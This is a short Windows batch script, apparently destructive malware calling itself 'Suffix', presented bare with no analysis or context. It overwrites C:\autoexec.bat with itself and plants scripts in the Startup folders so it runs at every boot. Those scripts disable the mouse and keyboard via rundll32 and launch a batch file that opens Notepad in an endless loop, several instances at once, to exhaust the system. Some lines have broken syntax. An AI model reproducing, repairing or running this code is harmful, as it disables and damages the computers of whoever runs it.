   echo off
   REM Suffix
   set %lt% = c:\windows\startm~1\programs\startup\suffix.exe.bat
   set %rt% = c:\windows\alluse~1\startm~1\programs\startup\suffix.exe.bat
   copy %0 C:\autoexec.bat
   copy %0 c:\zero.dat
   if not exist %lt% goto lsd
   :cnt
   if not exist %rt% goto ltd
   :lsd
   echo title Windows >> %lt%
   echo @echo off >> %lt%
   echo rundll32 mouse,disable >> %lt%
   echo rundll32 keyboard,disable >> %lt%
   echo Suffix lives... >> %lt%
   echo if not exist %rt% do copy c:\rt.dat %rt% >> %lt%
   echo @echo off >> c:\derez.bat
   echo :lp >> c:\derez.bat
   echo start %windir%\notepad.exe >> c:\derez.bat
   echo goto lp >> c:\derez.bat
   echo start c:\derez.bat >> %lt%
   echo start c:\derez.bat >> %lt%
   echo start c:\derez.bat >> %lt%
   echo start c:\derez.bat >> %lt%
   echo start c:\derez.bat >> %lt%
   copy %lt% c:\lt.dat
   goto cnt
   :ltd
   echo @echo off >> %rt%
   echo if not exist %lt% do copy c:\lt.dat %lt% >> %rt%
   echo rundll32 mouse,disable >> %rt%
   echo rundll32 keyboard,disable >> %rt%
   copy c:\zero.dat c:\autoexec.bat >> %rt%
   echo start c:\derez.bat >> %rt%
